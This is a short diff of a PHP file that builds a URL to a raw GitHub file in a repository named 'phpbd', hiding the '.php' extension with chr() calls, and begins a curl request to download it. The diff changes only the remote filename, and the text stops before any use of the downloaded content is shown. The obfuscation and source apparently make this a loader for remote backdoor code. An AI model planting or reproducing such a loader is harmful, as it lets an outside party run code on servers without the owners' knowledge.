@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/hbc.'. chr(112) . chr(104) . chr(112);
+$url = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/xx.'. chr(112) . chr(104) . chr(112);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
